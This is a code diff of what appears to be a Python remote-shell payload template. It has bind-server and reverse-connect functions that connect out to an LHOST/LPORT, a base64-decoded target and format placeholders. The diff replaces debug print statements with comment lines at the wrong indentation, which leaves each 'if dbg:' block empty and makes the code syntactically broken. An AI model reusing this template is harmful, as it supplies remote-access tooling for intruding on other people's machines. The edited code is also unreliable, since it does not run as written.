@@ -33,7 +33,7 @@ def add_bind_server(BHOST,BPORT):
         self.stop_bind_server = False
         # if no target is defined, we listen on all interfaces
         if dbg:
-            print('creating server')
+    # print('creating server')
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         target = base64.b64decode("{}")
@@ -50,7 +50,7 @@ def add_bind_server(BHOST,BPORT):
                 client_socket.settimeout(None)
             except Exception:
                 if dbg:
-                    print(e)
+    # print(e)
                 client_socket=None
                 pass
             if client_socket:
@@ -78,7 +78,7 @@ def add_listen_server(LHOST,LPORT):
                 sleep(5)
                 pass
             if dbg:
-                print('trying to connect')
+    # print('trying to connect')
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             client_socket.settimeout(5)
@@ -96,7 +96,7 @@ def add_listen_server(LHOST,LPORT):
                     client_socket.close()
             except Exception:
                 if dbg:
-                    print(e)
+    # print(e)
                 client_socket.close()
 
     def halt_listen_server(self):
@@ -121,7 +121,7 @@ def main():
             pass
         except Exception:
             if dbg:
-                print(e)
+    # print(e)
             pass
         st_pyld.halt_bind_server()
         st_pyld.halt_listen_server()
@@ -144,7 +144,7 @@ def main():
             pass
         except Exception:
             if dbg:
-                print(e)
+    # print(e)
             pass
         st_pyld.halt_listen_server()
 
@@ -166,7 +166,7 @@ def main():
             pass
         except Exception:
             if dbg:
-                print(e)
+    # print(e)
             pass
         st_pyld.halt_bind_server()
 
@@ -414,7 +414,7 @@ def client_handler({2}):
         {2}.close()
     except Exception:
         if dbg:
-            print(e)
+    # print(e)
         {2}.close()
 
 dbg = False
